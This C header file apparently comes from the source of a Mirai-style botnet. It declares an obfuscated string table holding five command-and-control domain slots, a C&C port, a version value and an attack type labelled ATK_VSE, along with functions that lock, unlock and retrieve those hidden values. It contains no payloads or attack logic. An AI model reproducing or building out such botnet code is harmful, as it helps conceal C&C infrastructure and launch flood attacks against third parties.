#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
    BOOL locked;
};

#define TABLE_CNC_DOMAIN0               1
#define TABLE_CNC_DOMAIN1               2
#define TABLE_CNC_DOMAIN2               3
#define TABLE_CNC_DOMAIN3               4
#define TABLE_CNC_DOMAIN4               5

#define TABLE_CNC_PORT                  6
#define TABLE_VERSION                   7

#define TABLE_ATK_VSE                   8

#define TABLE_MAX_KEYS                  12

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
